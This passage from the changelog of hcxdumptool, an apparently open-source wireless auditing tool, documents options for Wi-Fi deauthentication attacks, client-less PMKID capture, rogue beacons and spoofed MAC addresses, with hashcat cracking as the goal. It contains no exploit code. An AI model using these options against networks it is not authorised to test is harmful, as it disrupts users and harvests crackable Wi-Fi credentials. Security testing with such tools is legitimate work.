0x72, 0x33,\n                                       0x83, 0x37, 0x27, 0xab, 0x59, 0x33, 0xb3, 0x62,\n                                       0x45, 0x37, 0x11, 0x47, 0xa7, 0xcf, 0x32, 0x7f,\n                                       0x8d, 0x69, 0x80, 0xc0, 0x89, 0x5e, 0x5e, 0x98\n              OPTIONCODE_MACMYORIG     0xf29a (6 byte)\n              OPTIONCODE_MACMYAP       0xf29b (6 byte)\n              OPTIONCODE_RC            0xf29c (8 byte)\n              OPTIONCODE_ANONCE        0xf29d (32 byte)\n              OPTIONCODE_MACMYSTA      0xf29e (6 byte)\n              OPTIONCODE_SNONCE        0xf29f (32 byte)\n              OPTIONCODE_WEAKCANDIDATE 0xf2a0 (32 byte)\n              OPTIONCODE_GPS           0xf2a1 (max 128 byte)\n             removed weak candidate check, because it leads to many, many unauthorized MP:M1M2\n\nhcxpioff: new options --tot, --poweroff, --reboot\n--tot=<digit>  : enable timeout timer in minutes (minimum = 2 minutes)\n               : hcxpioff will terminate if tot reached\n--reboot       : once hcxpioff terminated, reboot system\n\n\n20.09.2019\n==========\nhcxdumptool: added pcapng custom block\n             we store all custom information inside this block\n\nlist of used pcapng option codes:\n#define OPTIONCODE_MACMYORIG\t\t0xf29a\n#define OPTIONCODE_MACMYAP\t\t0xf29b\n#define OPTIONCODE_RC\t\t\t0xf29c\n#define OPTIONCODE_ANONCE\t\t0xf29d\n#define OPTIONCODE_MACMYSTA\t\t0xf29e\n#define OPTIONCODE_SNONCE\t\t0xf29f\n#define OPTIONCODE_WEAKCANDIDATE\t0xf2a0\n\n\n18.09.2019\n==========\nhcxdumptool: added new option --weak_candidate\n             added weak candidate detection on PMKID and WPA1\n             weak candidate is no longer \"hard coded\"\n---weak_candidate=<password>        : use this password (8...63 characters) for weak candidate alert\n                                     default: 00000000\n                                     affected: client-less attack\n\nlist of used pcapng option codes:\n#define OPTIONCODE_MACMYAP\t\t62107\n#define OPTIONCODE_RC\t\t\t62108\n#define OPTIONCODE_ANONCE\t\t62109\n#define OPTIONCODE_MACMYSTA\t\t62110\n#define OPTIONCODE_SNONCE\t\t62111\n#define OPTIONCODE_WEAKCANDIDATE\t62112\n\n\n17.09.2019\n==========\nhcxdumptool: added weak password check\n             high experimental, only on WPA2 QOS\n             new dependency: lib crypto (openssl)\n\n\n07.09.2019\n==========\nhcxdumptool: added new options\n\n--reactive_beacon                  : send internal/external beacon on every received proberequest\n                                     affected: ap-less\n--flood_beacon=<digit>             : transmit internal/external beacon after every <x> received management packet\n                                     affected: ap-less\n\n\n05.09.2019\n==========\nhcxdumptool: added new options (feature request: https://github.com/ZerBea/hcxdumptool/issues/70)\n\n--disable_internal_beacons         : do not transmit beacons using received ESSIDs\n                                     default: transmit this kind of beacon once on channel change or every five seconds\n                                     affected: ap-less and reactive_beacon, flood_beacon\n--use_external_beaconlist=<file>   : transmit beacons from this list\n                                     maximum ESSID length 32, maximum entries 4095\n                                     default: transmit this kind of beacon once on channel change or every five seconds\n                                     affected: ap-less and reactive_beacon, flood_beacon\n\n\n28.08.2019\n==========\nmoved to v5.2.2\n\n\n02.09.2019\n==========\nhcxdumptool : added bind() ll.sll_pkttype = PACKET_OTHERHOST | PACKET_OUTGOING\n              added setsockopt() r.mr_type = PACKET_MR_PROMISC\n\nnow dmesg will show when device entered promiscuous mode\nduring hcxdumptool initialization:\n[ 6313.657830] device wlp3s0f0u11u1 entered promiscuous mode\n\nand when it left promiscuous mode when hcxdumptool terminated:\n[ 6313.735833] device wlp3s0f0u11u1 left promiscuous mode\n\n\n01.09.2019\n==========\nhcxdumptool     : print additional information about interfering services\nfirst_steps.txt : added quickstart guide to docs\n\n\n28.08.2019\n==========\nmoved to v5.2.1\n\n\n25.08.2019\n==========\nhcxdumptool: removed option --ignore_warning (no longer needed)\n             hcxdumptool forces to set monitor mode running ioctl(SIOCGIWMODE) IW_MODE_MONITOR\n             if that doesn't work on first try, try it again and/or\n             do monitor mode manually:\n             ip link set <interface> down\n             iw dev <interface> set type monitor\n             ip link set <interface> up\n\nwarning:     on some drivers rtlXXXX netlink will not notice that we use forced ioctl() system calls\n             in that case iw dev wlp3s0f0u11u4 will show you that the \"netlink part\" is still managed\n             Interface wlp3s0f0u11u4\n             ifindex 11\n             wdev 0x800000001\n             addr 70:f1:1c:27:ae:ec\n             type managed\n             wiphy 8\n             txpower 13.00 dBm\n\n\n19.08.2019\n==========\nmoved to v5.2.0\n\n\n18.08.2019\n==========\nhcxdumptool: print ESSID on status 1\n\n\n15.08.2019\n==========\nhcxdumptool: added server - client status output (only local networkes)\n--server_port=<digit>              : define port for server status output (1...65535)\n                                   : default IP: 224.0.0.255\n--client_port=<digit>              : define port for client status read (1...65535)\n                                   : default IP: 224.0.0.255\n\nexample:\non client machine run hcxdumptool with option --client_port=12345\n$ hcxdumptool -i <interface> -o test.pcapng --enable_status=1 --client_port=12345\n\non caputure machine run hcxdumptool with option --server_port=12345\n$ hcxdumptool -i <interface> -o test.pcapng --enable_status=1 --server_port=12345\n\n\n13.08.2019\n==========\nhcxdumptool: added new option --check_driver\n--check_driver      : run several tests to determine that driver support all(!) required system calls\n\nIf everything is fine, result should look like this:\n$ sudo hcxdumptool -i wlp3s0f0u10u4 --check_driver\ndriver tests passed - all required ioctl() system calls are supported by driver\n\nIf not, hcxdumptool will show which test failed:\n$ sudo hcxdumptool -i wlp3s0f0u10u5 --check_driver\nioctl(SIOCGIFFLAGS) failed: No such device\nioctl(SIOCGIWMODE) failed: No such device\nioctl(SIOCSIFFLAGS) failed: No such device\nioctl(SIOCSIWMODE) - IW_MODE_MONITOR failed: No such device\nioctl(SIOCGIWMODE) failed: No such device\nioctl(SIOCGIWMODE) - IW_MODE_MONITOR failed\nioctl(SIOCSIFFLAGS) -IFF_UP failed: No such device\nioctl(SIOCGIFFLAGS) failed: No such device\nioctl(SIOCGIFFLAGS) - IFF_UP | IFF_RUNNING | IFF_BROADCAST failed\nioctl(SIOCGIFINDEX) failed: No such device\nioctl(SIOCETHTOOL) - ETHTOOL_GPERMADDR failed: No such device\nioctl(SIOCSIWFREQ) - IW_FREQ_FIXED failed: No such device\nit looks like this interface/driver isn't suitable for hcxdumptool\npossible reasons:\nwrong interface selected\ninterface is blocked by another tool\ndriver doesn't support required ioctl() system calls\n\n\n12.08.2019\n==========\nhcxdumptool: a crappy filter list is not longer a reason to terminate initialization\n\n\n11.08.2019\n==========\nhcxdumptool: added new options --tot and --reboot  \n--tot=<digit>                      : enable timeout timer in minutes (minimum = 2 minutes)\n                                   : hcxdumptool will terminate if tot reached (EXIT code = 2)\n--reboot                           : once hcxdumptool terminated, reboot system\n\nhcxdumptool return values:\n0 = every thing is fine\n1 = error occured\n2 = tot reached\n\n\n23.07.2019\n==========\nhcxdumptool: moved from usleep() to nanosleep()\nhcxpioff: moved from usleep() to nanosleep()\n\n\n17.07.2019\n==========\nadded some additional information which ioctl() command isn't supported by driver\nadded warning on option --do_rcascan if packet injection fails (driver doesn't support\nfull packet injection) after 20 seconds\n\nRemarks:\nnl80211/cfg80211/mac80211 doesn't use use ioctl() calls, they use netlink.\nhcxdumptool use ioctl() calls and will not work on netlink.\nThat is the case, if ioctl(SIOCGIWMODE) or ioctl(SIOCSIWMODE) calls failed!\n\nRead more here:\nhttps://www.quora.com/What-are-the-differences-between-netlink-sockets-and-ioctl-calls\n\n\n30.06.2019\n==========\nincreased maximum filter list entries from 64 up to 255\nthis will have a price tag, because hcxdumptool's respond time increases.\n\n\n25.06.2019\n==========\ndetect Raspberry Pi 4\n\n\n23.06.2019\n==========\nmoved to v 5.1.7\nhcxdumptool: improved help\n             fixed pcpng option header\n\n\n12.06.2019\n==========\nhcxdumptool: ignore more warnings if --ignore_warning is selcted\n             do not report issues if you run this option!!!\n\n\n29.05.2019\n==========\nhcxdumptool moved to v 5.1.5\n\n\n19.05.2019\n==========\nhcxdumptool: activated option --ignore warning\n--ignore_warning                   : ignore warnings\n                                     try this if you get some driver warnings\n                                     do not report issues\n\n\n16.04.2019\n==========\nupdated wiki device and README.md.\nThis adapters are working fine, running kernel 4.19, 4.20 and 5.0:\nEDIMAX EW-7711UAN  ID 7392:7710 Edimax Technology Co., Ltd\nALLNET ALL-WA0150N ID 148f:7601 Ralink Technology, Corp. MT7601U Wireless Adapter\nTENDA W311U+       ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless Adapter\nLogiLink WL0151    ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless Adapter\nregardles of the xhci issue.\n\n\n14.04.2019\n==========\nremoved all device names from README.md, because VENDORS often change chipsets or driver errors occur:\nv1 of a device is working fine, while v2 doesn't work\ndevice A, running driver A is working fine, while device B running driver A doesn't work\ndriver doesn't support monitor mode\ndriver support monitor mode, but doesn't support packet injection\nExamples here:\nhttps://bugzilla.kernel.org/show_bug.cgi?id=202241\nhttps://bugzilla.kernel.org/show_bug.cgi?id=202243\nhttps://bugzilla.kernel.org/show_bug.cgi?id=202541\n\nTo find a working device, I recommend to read wikidevi:\nhttps://wikidevi.com/\n\n\n02.04.2019\n==========\nhcxdumptool now use this radiotap header:\n\nstatic const uint8_t hdradiotap[] =\n{\n0x00, 0x00, // radiotap version + pad byte\n0x0e, 0x00, // radiotap header length\n0x06, 0x8c, 0x00, 0x00, // bitmap\n0x00, // flags\n0x02, // rate\n0x14, // tx power\n0x01, // antenna\n0x08, 0x00 // tx flags\n#define HDRRT_SIZE sizeof(hdradiotap)\n};\n\nread more about radiotap header here:\nhttps://www.kernel.org/doc/Documentation/networking/mac80211-injection.txt\n\n\nheader is working with:\nID 148f:761a Ralink Technology, Corp. MT7610U (\"Archer T2U\" 2.4G+5G WLAN Adapter\n\nremoved \"USB ID 7392:a812 Edimax Technology Co., Ltd\" from \"known as working device list\"\nbecause this driver is not working with the radiotap header.\n\n\n30.03.2019\n==========\nhcxdumptool: added new option --silent\n--silent : do not transmit!\n           hcxdumptool is acting like a passive dumper\n\nadded RTL8187. Removed the wron devices from the list (only RT3070 ia affected)\n* USB ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter (ALFA AWUS036H)\n* USB ID 0bda:8189 Realtek Semiconductor Corp. RTL8187B Wireless 802.11g 54Mbps Network Adapter\n\n\n29.03.2019\n==========\nadded cflag DEBUG\nif compiled with DEBUG, hcxdumptool show raw packets and raw GSP data, directly received from the device\n\nremoved ALFA AWUS036NH from the \"known as workinging list\", because the device doesn't work\nany longer, running kernel 5.0.\n\n\n28.03.2019\n==========\nremoved devices from \"known working\" list:\n* USB ID 0bda:8187 Realtek Semiconductor Corp. RTL8187 Wireless Adapter (ALFA AWUS036H)\n* USB ID 0bda:8189 Realtek Semiconductor Corp. RTL8187B Wireless 802.11g 54Mbps Network Adapter\nbecause they are not working running kernel 5.0\n\n\n27.03.2019\n==========\nremoved wiringPi dependency\nnow we are running \"bare metal\" - complete GPIO stuff moved to hcxdumptool and hcxpioff\ndo not use wiringPi in combination with hcxdumptool and/or hcxpioff\nMakefile: removed DOGPIOSUPPORT\nhcxdumptool: changed options wiringPi options to GPIO options\n--gpio_button=<digit>              : Raspberry Pi GPIO pin number of button (2...27)\n                                     default = GPIO not in use\n--gpio_statusled=<digit>           : Raspberry Pi GPIO number of status LED (2...27)\n                                     default = GPIO not in use\n\nhcxpioff: changed options wiringPi options to GPIO options\n--gpio_button=<digit>              : Raspberry Pi GPIO pin number of button (2...27)\n                                     default = GPIO not in use\n--gpio_statusled=<digit>           : Raspberry Pi GPIO number of status LED (2...27)\n                                     default = GPIO not in use\n\nThe GPIO is disabled on default. If you like to activate GPIO support you must do\nthe hardware modifactions as described here: doc/gpiowait.odg\nand set the options according to your modification.\nYou can choose every GPIO pin, as long as you use a pull down resistor to ground. \nRaspberry model should be detected by automatic and according to the revision we use:\nGPIO mem 0x20000000 for A, B, A+, B+, and Zero, Zero W(H)\nGPIO mem 0x3F000000 for 2B, 3B, 3A+, 3B+\ncompute modules (CMx) are not supported.\n\n\n20.03.2019\n==========\nhcxdumptool: GPIO pins are no longer hard coded!\n--wpi_button=<digit>    : wiringPi number of of button (0...31, Raspberry Pi A and B: 0 .. 16)\n                          default = 7\n--wpi_statusled=<digit> : wiringPi number of status LED (0...31, Raspberry Pi A and B: 0 .. 16)\n                          default = 0\n\n\n19.03.2019\n==========\nhcxpioff: refactored - GPIO pins are no longer hard coded!\n--wpi_button=<digit>    : wiringPi number of of button (0...31, Raspberry Pi A and B: 0 .. 16)\n                          default = 7\n--wpi_statusled=<digit> : wiringPi number of status LED (0...31, Raspberry Pi A and B: 0 .. 16)\n                          default = 0\n--help                  : show this help\n--version               : show version\n\n\n16.03.2019\n==========\nadded man page hcxdumptool.1\nremoved device from list: \nUSB ID 7392:a812 Edimax Technology Co., Ltd (Edimax AC600 USB / Manufacturer: Realtek)\nbecause the driver from here: https://github.com/aircrack-ng/rtl8812au\nis no longer working on kernel 5.0\n\n\n09.03.2019\n==========\nhcxdumptool moved to v 5.1.4\n\nhcxdumptool: added new option:\n--ignore_warning                   : hcxdumptool will not terminate if other services take access on the device\n                                   : warning: expect problems if hcxdumptool tries to change channels\n\nFrom now on, hcxdumptool will not terminate during the initalization\nif another service take access on the interface.\nExpect problems and do not report issues related to this option!!!!\n\nFrom now on, hcxdumptool will also show channel and frequency (when running option -C)\n  1 / 2412MHz (20 dBm)\n  2 / 2417MHz (20 dBm)\n  3 / 2422MHz (20 dBm)\n  4 / 2427MHz (20 dBm)\n  5 / 2432MHz (20 dBm)\n  6 / 2437MHz (20 dBm)\n  7 / 2442MHz (20 dBm)\n  8 / 2447MHz (20 dBm)\n  9 / 2452MHz (20 dBm)\n 10 / 2457MHz (20 dBm)\n 11 / 2462MHz (20 dBm)\n 12 / 2467MHz (20 dBm)\n 13 / 2472MHz (20 dBm)\n\n\n09.03.2019\n==========\nhcxdumptool: added improved warning message\nNow hcxdumptool print the error message received from the driver inside the brackets\n$ hcxdumptool -i wlp3s0f0u1 -c 14\ninitialization...\nwarning: unable to set channel 14 (Invalid argument) - removed this channel from scan list\n\nIn this case the user tried to set channel 14. The driver doesn't support this\nand responds with Invalid argument \n\n\n07.03.2019\n==========\nhcxdumptool: added debug code in main packet loop [processpackets()]\nto print raw GPS data, received from GPSD:\n/*\n\t\t\tprintf(\"\\ndebug: %s\\n\", gpsddata);\n*/\nuncomment this before you run make to retrieve this values.\n\n\n06.03.2019\n==========\nhcxdumptool: added GPS date and GPS time to status and pcapng comment field.\n\n$ sudo hcxdumptool -i wlp3s0f0u1 --use_gpsd -o test.pcapng\ninitialization...\nconnecting to GPSD...\nwaiting up to 5 seconds to retrieve first position\nGPSD activated\n\nstart capturing (stop with ctrl+c)\nGPS LATITUDE.............: 49.126403\nGPS LONGITUDE............: 4.626175\nGPS ALTITUDE.............: 129.500000\nGPS DATE.................: 06.03.2019\nGPS TIME.................: 21:52:41\nINTERFACE................: wlp3s0f0u1\nERRORMAX.................: 100 errors\nFILTERLIST...............: 0 entries\nMAC CLIENT...............: f04f7c89dabb\nMAC ACCESS POINT.........: 980ee432604d (incremented on every new client)\nEAPOL TIMEOUT............: 150000\nREPLAYCOUNT..............: 61455\nANONCE...................: 182972399cd2e65deb7941601cca14b644681c092dcf6f704935c7f3d2eaceea\n\nINFO: cha=11, rx=7080, rx(dropped)=1676, tx=408, powned=10, err=0, lat=49.126342, lon=4.626268, alt=129.500000, gpsdate=06.03.2019, gpstime=22:01:55^C\nterminated...\n\n$ tshark -r test.pcapng-0 -Y frame.comment -T fields -E header=y -e frame.number -e frame.time -e wlan.sa -e frame.comment\n172\tMar  6, 2019 23:01:48.793212000 CET\t1a:f8:7c:91:24:a3\tlat:49.126337,lon:4.626268,alt:129.500000,date:06.03.2019,time:22:01:48\n\n\n05.03.2019\n==========\nhcxdumptool: removed general info about tx-power - now we use iw style to show tx-power/channel\nhcxdumptool -i <interface> -C\ninitialization...\navailable channels:\n1 (20 dBm)\n2 (20 dBm)\n3 (20 dBm)\n...\n132 (26 dBm)\n136 (26 dBm)\n140 (26 dBm)\n149 (13 dBm)\n153 (13 dBm)\n157 (13 dBm)\n161 (13 dBm)\n165 (13 dBm)\n\n\n26.02.2019\n==========\nhcxdumptool moved to version 5.1.3 due several bug fixes and improved rcascan status output\n\n\n18.02.2019\n==========\nrelease hcxdumptool v 5.1.2 due to serveral bugfixes\n\n\n02.02.2019\n==========\nrelease hcxdumptool v 5.1.1\n\n\n20.01.2019\n==========\nhcxdumptool:\nadded new MT76 device: \"TP-LINK Archer Archer T2U\"\nworking with kernel: 4.19, 4.20 (some issues), 5.0\nread more here:\nhttps://github.com/ZerBea/hcxdumptool/issues/42\nhttps://bugzilla.kernel.org/show_bug.cgi?id=202241\nhttps://bugzilla.kernel.org/show_bug.cgi?id=202243\n\n\n11.01.2019\n==========\nhcxdudmptool:\nFrom now on, we assume that a packet is outgoing, if\ndBm Antenne Signal is absent.\n\n\n08.01.2019\n==========\nhcxdudmptool and mac80211_hwsim\nmac80211_hwsim is a Linux kernel module that can be used to simulate\narbitrary number of IEEE 802.11 radios for mac80211. It can be used to\ntest hcxdumptool:\nload module:\n$ sudo modprobe mac80211_hwsim\n\nrun hcxdumptool to retrieve informations about the interface:\n$ hcxdumptool -I\nwlan interfaces:\n020000000000 wlan0 (mac80211_hwsim)\n020000000100 wlan1 (mac80211_hwsim)\n\nbring monitor interface up:\n$ sudo sudo ip link set hwsim0 up\n\nrun hcxdumptool:\n$ sudo hcxdumptool -i wlan0\ninitialization...\n\nstart capturing (stop with ctrl+c)\nINTERFACE:...............: wlan0\nERRORMAX.................: 100 errors\nFILTERLIST...............: 0 entries\nMAC CLIENT...............: c8aacc9c01ec\nMAC ACCESS POINT.........: 580943000000 (incremented on every new client)\nEAPOL TIMEOUT............: 150000\nREPLAYCOUNT..............: 62263\nANONCE...................: 513282ebb604e6e10c450d6c3eaa6428d118b54abeef4672be3ef700052305d5\n\nINFO: cha=11, rx=0, rx(dropped)=0, tx=120, powned=0, err=0\n\nrun wireshark on wlan0 or hwsim0 to monitor hcxdumptool output.\ndo not forget to remove mac80211_hwsim if the module is not longer needed!\n\nread more here:\nhttps://www.kernel.org/doc/readme/Documentation-networking-mac80211_hwsim-README\n\n\n04.01.2019\n==========\nhcxdumptool - changed flash time:\nLED flashes every 5 seconds = everything is fine\nLED stays on = no signal received during the last past five seconds\nhcxdumptool - ignore double outgoing packets (rth->it_present == 0)\n\n\n03.01.2019\n==========\nhcxdumptool: changed flash time (5 times longer on ERROR)\nhcxpioff: changed flash time\n\n\n20.12.2018\n==========\nimproved detection of broken driver\nfrom now on GPIO LED blinks twice every 5 seconds\n- if a possbile driver issue is detected\n- if no packets received during the last past 5 seconds\n\nanother indicator is that the incoming packetcounter (rx=xxxx)\ndoesn't increase\n\nor dmesg show this error:\n[65786.808078] ieee80211 phy2: rt2x00queue_flush_queue: Warning - Queue 14 failed to flush\n[65824.174119] ieee80211 phy2: rt2x00queue_flush_queue: Warning - Queue 14 failed to flush\n[67801.029527] ------------[ cut here ]------------\n\nit seems to be a kernel issue that hcxdumptool isn't able to handle, automatically:\nhttps://bbs.archlinux.org/viewtopic.php?id=237028\nhttps://bugs.openwrt.org/index.php?do=details&task_id=929&opened=169&status%5B0%5D=\nhttps://community.spiceworks.com/topic/2132263-ubuntu-16-04-wifi-disconnects-randomly\nhttps://bugs.launchpad.net/ubuntu/+source/linux/+bug/1750226\nhttps://www.raspberrypi.org/forums/viewtopic.php?t=206815\n\nworkaround:\n1) get driver information\n$ hcxdumptool -I\nwlan interfaces:\n7cdd90xxxxxx wlp3s0f0u2 (rt2800usb)\n\n2) remove module\n$ modprobe -r rt2800usb\n\n3) load module\n$ modprobe rt2800usb\n\n\n18.12.2018\n==========\nadded new option to set station MAC address\n--station_mac=<mac_addr>           : use this MAC address for station\n                                     format = 112233445566\n                                     format = 112233000000  (to set only OUI)\n                                     format = 445566 (to set only NIC)\n\nadded new option to set access point MAC address\n--ap_mac=<mac_addr>                : use this MAC address for access point as start MAC\n                                     format = 112233445566\n                                     format = 112233000000  (to set only OUI)\n                                     format = 445566 (to set only NIC)\n                                     warning: do not use a MAC of an existing access point in your range\n\nimproved detection of broken driver\nset default ERRORMAX to 100\nadded option to set ERRORMAX\n-T <digit>     : set maximum ERRROR count (hcxdumptool terminates when the value is reached)\n                 default: 100 errors\n\nRemarks:\nerrorcount will increase by one, if send packet (tx=xxx) > 3*incoming packets (rx=xxx)\n\n\n15.12.2018\n==========\nimproved random generator (now seeded with and adapter mac address) \nRaspberry Pi: improved handling of GPIO switch\n\n\n07.12.2018\n==========\nrestore interface settings after -C\nimproved help menu\n-more informations about monitor mode\n-more informations about packet injection\nmonitor mode and packet injection must be supported by the driver,\notherwise hcxdumptool will not work.\n\n\n05.12.2018\n==========\nmoved to v 5.1.0 (according to hashcat)\n\n\n04.12.2018\n==========\nadded new option:\n-C             : show available channels and quit\n\n\n27.11.2018\n==========\nadded new option:\n--poweroff                         : once hcxdumptool finished, power off system\n\n\n26.11.2018\n==========\nseveral big endian fixes\nswitched to version 5.0.1\n\n\n07.10.2018\n==========\nadded new option filter mode 3:\n--filterlist=<file>                : mac filter list\n                                     format: 112233445566 + comment\n                                     maximum line lenght 255, maximum entries 64\n--filtermode=<digit>               : mode for filter list\n                                     1: use filter list as protection list (default) in transmission branch\n                                        receive everything, interact with all APs and CLIENTs in range,\n                                        except(!) the ones from the filter list\n                                     2: use filter list as target list in transmission branch\n                                        receive everything, only interact with APs and CLIENTs in range,\n                                        from the filter list\n                                     3: use filter list as target list in receiving branch\n                                        only receive APs and CLIENTs in range,\n                                        from the filter list\n\n\n30.10.2018\n==========\nmoved to version 5.0.0\n\n\n05.10.2018\n==========\nadded more error messages\nfixed small bug in error count on channel change failure\n\n\n04.10.2018\n==========\nshow GPS position (if activated) in status line (refresh every 5 seconds)\nfixed broken status display on rcascan\nincreased speed of rcascan\nfixed error handling if selected channels not supported by driver\nif option -t is not set, skip empty channels after one second \nimproved scan list\nfixed some static var\n\n\n01.10.2018\n==========\nchanged order of channels in default scan list:\n1, 9, 6, 3, 11, 7, 1, 10, 6, 8, 11, 4, 1, 12, 6, 2, 11, 5, 13\n\n\n27.09.2018\n==========\nadded GPSD support (stored as comment in pcapng file)\n--use_gpsd                         : use GPSD to retrieve position\n                                     add latitude, longitude and altitude to every pcapng frame\ndevice must be supported by GPSD:\nhttp://www.catb.org/gpsd/hardware.html\n(tested using: AktivePilot JENTRO BT-GPS-8)\n\nRetrieve GPS information with:\n$ tshark -r filename.pcapng -Y frame.comment -T fields -E header=y -e frame.number -e frame.time -e wlan.sa -e frame.comment\n\n\nwrite mac_ap to pcapng SHB\nwrite mac_sta to pcapng SHB\nSHB optioncodes:\n#define OPTIONCODE_MACMYAP\t62107\n#define OPTIONCODE_RC\t\t62108\n#define OPTIONCODE_ANONCE\t62109\n#define OPTIONCODE_MACMYSTA\t62110\n\n\n16.09.2018\n==========\nshow warning if NetworkManager and/or wpa_supplicant is running\n\n\n15.09.2018\n==========\nadded Cisco Systems, Inc VENDOR information\n--station_vendor=<digit>           : use this VENDOR information for station\n                                     0: transmit no VENDOR information (default)\n                                     1: Broadcom\n                                     2: Apple-Broadcom\n                                     3: Sonos\n                                     4: Netgear-Broadcom\n                                     5: Wilibox Deliberant Group LLC\n                                     6: Cisco Systems, Inc\n\n\n11.09.2018\n==========\nYou can “uncomment a line” in a configuration file\nby removing the # at the start of the line.\nOr, to “comment out” a line, add a # character\nto the start of the line. \n\n001122334455 myap\n# aabbccddeeff ignore this mac\n112233445566 second ap\n# this is may comment\n\n\n05.09.2018\n==========\nadded Netgear Broadcom VENDOR information\nadded Wilibox Deliberant Group LLC VENDOR information\n\n\n04.09.2018\n==========\nimproved rcascan (show time and access points which hide their ESSID)\nprepare detection of PMF\nrefactored access point handling\nhandle 4096 access points simultaneously\nrefactored client handling\nhandle 4096 clients simultaneously\nspeed up retrieving PMKIDs (< 1 minute)\nattack access points which hide their ESSID\nincreased filter list line length\nincreased filter list maximum entries\nadded option to show beacons in status output:\n--enable_status=<digit>            : enable status messages\n                                     bitmask:\n                                      1: EAPOL\n                                      2: PROBEREQUEST/PROBERESPONSE\n                                      4: AUTHENTICATON\n                                      8: ASSOCIATION\n                                     16: BEACON\n\nadded option to choose station VENDOR information:\n--station_chipset=<digit>          : use this VENDOR information for station\n                                     0: transmit no VENDOR information (default)\n                                     1: Broadcom\n                                     2: Apple-Broadcom\n                                     3: Sonos\n\n\n30.08.2018\n==========\niw/ip functionality added!\nnow hcxdumptool will set monitor mode and bring up interface!\nprevious interface settings will be restored, when hcxdumptool terminated\n\n\n19.08.2018\n==========\nparse SAE authentication\n\n\n19.08.2018\n==========\nadded radio assignment scan\n--do_rcascan                       : show radio channel assignment (scan for target access points)\n--save_rcascan=<file>              : output rca scan list to file when hcxdumptool terminated\n--save_rcascan_raw=<file>          : output file in pcapngformat\n                                     unfiltered packets\n                                     including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n\n\n17.08.2018\n==========\ndetect NETWORK EAP authentication system\ntransmit BROADCAST beacon\n\n\n16.08.2018\n==========\nFrom now on we store open system authentications to pcapng\nonly if they have have a vendor specific field.\nwe are no longer interested in standard open system authentications (payload len = 6)\n\n\nchanged some default values:\n\n-D <digit>     : deauthentication interval\n                 default: 10 (every 10 beacons)\n                 the target beacon interval is used as trigger\n-A <digit>     : ap attack interval\n                 default: 10 (every 10 beacons)\n--give_up_deauthentications=<digit>: disable transmitting deauthentications after n tries\n                                     default: 100 tries (minimum: 4)\n                                     affected: connections between client an access point\n                                     deauthentication attacks will not work against protected management frames\n--give_up_ap_attacks=<digit>       : disable transmitting directed proberequests after n tries\n                                     default: 100 tries (minimum: 4)\n                                     affected: client-less attack\n                                     deauthentication attacks will not work against protected management frames\n\n\n\n13.08.2018\n==========\nincreased some attack values:\n--give_up_deauthentications=<digit>: disable transmitting deauthentications after n tries\n                                     default: 100 tries (minimum: 4)\n                                     affected: connections between client an access point\n                                     deauthentication attacks will not work against protected management frames\n--give_up_ap_attacks=<digit>       : disable transmitting directed proberequests after n tries\n                                     default: 100 tries (minimum: 4)\n\n\n07.08.2018\n==========\nmoved to 4.2.1\nadded communication between hcxdumptool and hcxpcaptool via pcapng option fields:\n62108 for REPLAYCOUNT uint64_t\n62109 for ANONCE uint8_t[32]\n\nenabled hardware handshake instead of software handshake\nchanged beavior auf status:\n--enable_status=<digit>            : enables status messages\n                                     bitmask:\n                                     1: EAPOL\n                                     2: PROBEREQUEST/PROBERESPONSE\n                                     4: AUTHENTICATON\n                                     8: ASSOCIATION\nNow we use a bitmask to deliver status messages.\n\n\n06.08.2018\n==========\nwrite ISB (Interface Statistic Block) at the end of a cpature\n\n\n04.08.2018\n==========\naddet new option (--disable-active_scan) to hcxdumptool\n--disable_active_scan: do not transmit proberequests to BROADCAST using a BROADCAST ESSID\n\n\n04.08.2018\n==========\nrelease hcxdumptool 4.2.0\ncomplete refactored:\n-various new options\n-measurement of EAPOL timeout\n-full support for hashcat hashmodes -m 16800 and 16801\n-now default format is pcapng\n\n\n$ ./hcxdumptool-bleeding --help\nhcxdumptool 4.2.0 (C) 2018 ZeroBeat\nusage  : hcxdumptool <options>\nexample: hcxdumptool -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status\n\noptions:\n-i <interface> : interface (monitor mode must be enabled)\n                 ip link set <interface> down\n                 iw dev <interface> set type monitor\n                 ip link set <interface> up\n-o <dump file> : output file in pcapngformat\n                 management frames and EAP/EAPOL frames\n                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n-O <dump file> : output file in pcapngformat\n                 unencrypted IPv4 and IPv6 frames\n                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n-W <dump file> : output file in pcapngformat\n                 encrypted WEP frames\n                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n-c <digit>     : set scanlist  (1,2,3,...)\n                 default scanlist: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12\n                 maximum entries: 127\n                 allowed channels:\n                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n                 34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64\n                 100, 104, 108, 112, 116, 120, 124, 128, 132,\n                 136, 140, 144, 147, 149, 151, 153, 155, 157\n                 161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216\n-t <seconds>   : stay time on channel before hopping to the next channel\n                 default: 5 seconds\n-E <digit>     : EAPOL timeout\n                 default: 100000 = 1 second\n                 value depends on channel assignment\n-D <digit>     : deauthentication interval\n                 default: 20 (every 20 beacons)\n                 the target beacon interval is used as trigger\n-A <digit>     : ap attack interval\n                 default: 20 (every 20 beacons)\n                 the target beacon interval is used as trigger\n-I             : show suitable wlan interfaces and quit\n-h             : show this help\n-v             : show version\n\n--filterlist=<file>                : mac filter list\n                                     format: 112233445566 + comment\n                                     maximum line lenght 128, maximum entries 32\n--filtermode=<digit>               : mode for filter list\n                                     1: use filter list as protection list (default)\n                                     2: use filter list as target list\n--disable_deauthentications:         disable transmitting deauthentications\n                                     affected: connections between client an access point\n                                     deauthentication attacks will not work against protected management frames\n--give_up_deauthentications=<digit>: disable transmitting deauthentications after n tries\n                                     default: 10 tries (minimum: 4)\n                                     affected: connections between client an access point\n                                     deauthentication attacks will not work against protected management frames\n--disable_disassociations          : disable transmitting disassociations\n                                     affected: retry (EAPOL 4/4 - M4) attack\n--disable_ap_attacks               : disable attacks on single access points\n                                     affected: client-less (PMKID) attack\n--give_up_ap_attacks=<digit>       : disable transmitting directed proberequests after n tries\n                                     default: 10 tries (minimum: 4)\n                                     affected: client-less attack\n  